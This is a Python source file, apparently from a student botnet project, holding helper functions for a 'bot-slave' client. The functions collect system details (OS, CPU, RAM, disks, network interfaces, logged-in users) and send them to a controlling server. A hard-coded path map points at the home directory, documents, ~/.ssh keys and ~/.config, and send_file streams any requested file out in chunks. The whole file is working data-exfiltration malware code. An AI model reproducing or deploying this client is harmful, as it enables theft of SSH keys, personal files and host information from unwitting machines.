"""
Codice sorgente contenente funzioni di supporto per il bot-slave.

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
# Librerie globali
import socket
from cpuinfo import get_cpu_info
from datetime import datetime as dt
import psutil
import platform
import asyncio
import os  # Utilizzato per il controllo dell'esistenza del file (Alternativamente è possibile utilizzare path -> path('dir/myfile.txt').abspath())
# from functools import partial  # Per comodità leggiamo il file da inviare in chunk di dati -> Sostituito con un iteratore
# from time import sleep

# Definiamo degli header custom per identificare il tipo di dato inviato al server
__headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-Not-Found>",
                  "2": b"<OS-type>",
                  "3": b"<CPU-stats>", "3-1": b"<CPU-Brand>", "3-2": b"<CPU-Count>", "3-3": b"<CPU-Count-Logical>", "3-4": b"<CPU-Min-Freq>", "3-5": b"<CPU-Max-Freq>",
                  "4": b"<Ram-usage>", "4-1": b"<Ram-Current-Usage>", "4-2": b"<Ram-Total>",
                  "5": b"<Partition-disk-info>", "5-1": b"<Partition-Device>", "5-2": b"<Partition-MountPoint", "5-3": b"<Partition-FSType",
                  "6": b"<Partition-disk-status>", "6-1": b"<Partition-disk-read-status>", "6-2": b"<Partition-disk-write-status>",
                  "7": b"<Network-info>", "7-1": b"<Network-Interface>", "7-2": b"<Network-IP>", "7-3": b"<Network-NetMask>", "7-4": b"<Network-Broadcast>",
                  "8": b"<Users>", "8-1": b"<Users-Name>", "8-2": b"<Users-Active-Since>",
                  "9": b"<Content-Path>",
                  "10": b"<Waiting-For-File>"}

__filesystem_hierarchy = {"Home": f"/home/{os.getlogin()}/",  # TODO: Exclude path from research
                          "Images": f"/home/{os.getlogin()}/Immagini",  # TODO: Generalize for LANG
                          "Documents": f"/home/{os.getlogin()}/Documenti",  # TODO: Generalize for LANG
                          "SSH Keys": f"/home/{os.getlogin()}/.ssh/",  # ~/.ssh/*
                          "Config": f"/home/{os.getlogin()}/.config/",  # ~/.config/*
                          "local": f"/home/{os.getlogin()}/.local/share"  # ~/.local/share/*
                          }

"""
Per semplicità le funzioni utilizzate dal writer sono parametrizzate utilizzando i campi presenti negli __headers_type (per una migliore gestione dei casi)
"""


def get_operating_system() -> bytes:
    """Recupero informazioni del SO in esecuzione sulla macchina."""
    # Ritorniamo il campo con il maggior numero di informazioni possibili
    return (__headers_type["2"] + platform.platform().encode())  # example: Linux-5.15.0-50-generic-x86-64-with-glib2.35


def get_cpu_information() -> bytes:
    """Recupero informazioni sulla cpu della macchina."""
    # cpu_info = get_cpu_info()  # json with processor information
    # CPU Brand
    cpu_brand = get_cpu_info()['brand_raw']
    # Core info
    logical_core = psutil.cpu_count()
    physical_core = psutil.cpu_count(logical=False)

    # CPU Freq info
    min_cpu_freq = psutil.cpu_freq().min
    max_cpu_freq = psutil.cpu_freq().max

    return (__headers_type["3"] + __headers_type["3-1"] + cpu_brand.encode() + __headers_type["3-2"] + str(physical_core).encode() +  # Inviamo un struttura parametrizzata più semplice da gestire
            __headers_type["3-3"] + str(logical_core).encode() + __headers_type["3-4"] + str(min_cpu_freq).encode() + __headers_type["3-5"] + str(max_cpu_freq).encode())


def get_size(bytes, suffix="B") -> str:
    """Conversione di bytes in un formato Human readable."""
    """e.g: 1253656 => '1.20MB' 1253656678 => '1.17GB'"""
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def get_ram_size() -> bytes:
    """Recupero informazioni ram della macchina."""
    total_mem = psutil.virtual_memory().total
    used_mem = psutil.virtual_memory().used
    return (__headers_type["4"] + __headers_type["4-1"] + get_size(used_mem).encode() + __headers_type["4-2"] + get_size(total_mem).encode())


# Gestiamo il recupero e l'invio al server in place
async def get_partition_disk_info(writer: asyncio.StreamWriter) -> None:  # TODO: Controllare che funzioni anche con altri OS
    """Recupero informazioni del disco."""
    # NB: È obbligatorio fare un loop per ottenere le info di ogni partizione
    for partition in psutil.disk_partitions():
        if not partition.device.startswith("/dev/loop") and not partition.mountpoint.startswith("/var/snap"):  # In questo modo escludiamo i mount point di snap
            writer.write(__headers_type["5"] + __headers_type["5-1"] + partition.device.encode() +
                         __headers_type["5-2"] + partition.mountpoint.encode() + __headers_type["5-3"] + partition.fstype.encode())
            await asyncio.sleep(1)


def get_io_disk_statistics() -> bytes:
    """Recupero statistiche I/O del disco."""
    # get IO statistics since boot
    return(__headers_type["6"] + __headers_type["6-1"] + get_size(psutil.disk_io_counters().read_bytes).encode() +
           __headers_type["6-2"] + get_size(psutil.disk_io_counters().write_bytes).encode())


async def get_network_info(writer: asyncio.StreamWriter) -> None:
    """Recupero informazioni sulla rete."""
    for i_name, interface_addresses in psutil.net_if_addrs().items():
        for i_addr in interface_addresses:
            # Per evitare di ricevere errori nell'encoding di una variabile con NoneType facciamo uso di una variabile d'appoggio che controlla interattivamente il suo valore
            broadcast_ip = "None" if i_addr.broadcast is None else i_addr.broadcast
            netmask_ip = "None" if i_addr.netmask is None else i_addr.netmask
            writer.write(__headers_type["7"] + __headers_type["7-1"] + i_name.encode() + __headers_type["7-2"] + i_addr.address.encode() +
                         __headers_type["7-3"] + netmask_ip.encode() + __headers_type["7-4"] + broadcast_ip.encode())
            await asyncio.sleep(1)


async def get_users(writer: asyncio.StreamWriter) -> None:
    """Recupero della lista degli utenti presenti sulla macchina ospite."""
    for user in psutil.users():
        writer.write(__headers_type["8"] + __headers_type["8-1"] + user.name.encode() +
                     __headers_type["8-2"] + str(dt.fromtimestamp(user.started)).encode())
        await asyncio.sleep(1)


# Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
def get_path_content(content_path: str) -> list:
    """Funzione per il recupero del contenuto di directory e file dato un path."""
    current_position = __filesystem_hierarchy.get(content_path)
    total_files = []
    if content_path == "Home":
        for single_dir in os.listdir(current_position):
            total_files.append(os.path.join(current_position, single_dir))
    else:
        for path, dirs, files in os.walk(current_position):
            for filename in files:
                total_files.append(os.path.join(path, filename))
    return total_files


async def send_file(request: str, size: int, writer: asyncio.StreamWriter):
    """Invio di uno specifico file dal client al server."""
    if os.path.exists(os.path.abspath(request)):  # Controlliamo che il file richiesto esista
        # Nel caso in cui il file esista calcoliamo una dimensione (utilizzato per definire la dimensione di ogni chunk) che rispetti il pacchetto che stiamo inviando al server

        final_request = request if os.path.isabs(request) is False else os.path.basename(request)

        final_size = size - len(__headers_type["1"]) - len(__headers_type["1-1"]) - len(final_request)
        with open(request, 'rb') as filename:
            for chunk in iter(lambda: filename.read(final_size), ""):
                if chunk:
                    # L'ogetto che riceverà il client sarà del tipo <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
                    writer.write(__headers_type["1"] + final_request.encode() + __headers_type["1-1"] + chunk)
                    await asyncio.sleep(2)  # Controllare se sia possibile diminuire lo sleep (o se sia invece obbligatorio aumentarlo)
                    print(f"Sent: {len(chunk)} bytes")
                else:
                    break
    else:
        print("Request failed")
        writer.write(__headers_type["1-2"] + request.encode())


async def send_dir_content(request: str, writer: asyncio.StreamWriter):
    """Gestione dell'invio del contenuto di uno specifico PATH richiesto dal server."""
    for files in get_path_content(request):
        writer.write(__headers_type["9"] + files.encode())
        await asyncio.sleep(1)
    writer.write(__headers_type["10"])


def test_connection(hostname: str, port: int) -> bool:
    """Funzione di controllo per lo stato del server (in ascolto o meno)."""
    """Variante della funzione port_validator."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tester:
        try:
            if (tester.connect_ex((hostname, port)) == 0):
                # print(f"Il server {hostname} sulla porta {port} è attualmente raggiungibile")
                return True
            else:
                # print(f"Il server {hostname} sulla porta {port} non è attualmente raggiungibile.")
                return False
        except Exception as e:
            print(e)
